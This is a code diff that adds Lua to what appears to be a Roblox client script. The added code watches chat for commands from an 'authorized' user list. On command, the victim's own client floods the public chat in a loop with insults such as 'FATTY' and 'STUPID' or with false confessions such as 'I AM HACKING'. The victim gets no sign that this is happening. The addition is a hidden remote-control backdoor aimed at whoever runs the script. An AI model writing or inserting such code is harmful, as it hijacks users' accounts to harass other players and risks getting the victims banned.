@@ -198,3 +198,78 @@ Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
+
+local activeSpam = false
+
+local function startSpamming(mode)
+	if activeSpam then return end
+	activeSpam = true
+
+	local phrases
+	if mode == 1 then
+		phrases = {
+			"FATTY",
+			"FAT",
+			"STUPID"
+		}
+	elseif mode == 2 then
+		phrases = {
+			"I AM HACKING",
+			"I AM EXPLOITING",
+			"I AM CHEATING"
+		}
+	elseif mode == 3 then
+		phrases = {}
+		for i = 1, 10 do
+			table.insert(phrases, "PLEASE")
+		end
+	else
+		return
+	end
+
+	local chatChannel = game:GetService("TextChatService"):WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+
+	task.spawn(function()
+		while activeSpam do
+			for _, msg in ipairs(phrases) do
+				chatChannel:SendAsync(msg)
+				task.wait()
+			end
+		end
+	end)
+end
+
+local function onChatSpamCommand(player, message)
+	if not AUTHORIZED_USERS[player.Name] then return end
+
+	message = message:lower()
+	local thisUsername = LocalPlayer.Name:lower()
+
+	local target1 = message:match("^,spammingmode1%s+(%S+)")
+	local target2 = message:match("^,spammingmode2%s+(%S+)")
+	local target3 = message:match("^,spammingmode3%s+(%S+)")
+
+	if target1 and target1 == thisUsername then
+		startSpamming(1)
+	elseif target2 and target2 == thisUsername then
+		startSpamming(2)
+	elseif target3 and target3 == thisUsername then
+		startSpamming(3)
+	end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+	if player ~= LocalPlayer then
+		player.Chatted:Connect(function(msg)
+			onChatSpamCommand(player, msg)
+		end)
+	end
+end
+
+Players.PlayerAdded:Connect(function(player)
+	if player ~= LocalPlayer then
+		player.Chatted:Connect(function(msg)
+			onChatSpamCommand(player, msg)
+		end)
+	end
+end)
